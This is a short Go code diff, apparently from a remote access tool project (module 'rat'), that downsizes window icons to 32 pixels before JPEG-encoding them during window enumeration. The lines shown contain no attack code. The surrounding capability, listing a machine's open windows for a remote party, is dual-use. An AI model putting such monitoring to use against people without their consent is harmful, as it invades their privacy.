@@ -12,10 +12,14 @@ import (
 	"image/jpeg"
 	"rat/shared"
 	"unsafe"
+
+	"github.com/disintegration/imaging"
 )
 
 // Windows array, will be populated after call to QueryWindows()
 var Windows []shared.Window
+
+const MaxIconWidth = 32
 
 // Callback for each window
 //export WindowCallback
@@ -63,12 +67,20 @@ func getEncodedIcon(icon C.Icon) string {
 		buf = C.GoBytes(unsafe.Pointer(icon.data), C.int(len))
 	}
 
-	var buffer bytes.Buffer
-	jpeg.Encode(&buffer, &image.RGBA{
+	var img image.Image
+
+	img = &image.RGBA{
 		Pix:    buf,
 		Stride: width * 4,
 		Rect:   image.Rect(0, 0, width, height),
-	}, &jpeg.Options{
+	}
+
+	if width > MaxIconWidth || height > MaxIconWidth {
+		img = imaging.Resize(img, MaxIconWidth, MaxIconWidth, imaging.Box)
+	}
+
+	var buffer bytes.Buffer
+	jpeg.Encode(&buffer, img, &jpeg.Options{
 		Quality: 75,
 	})
 
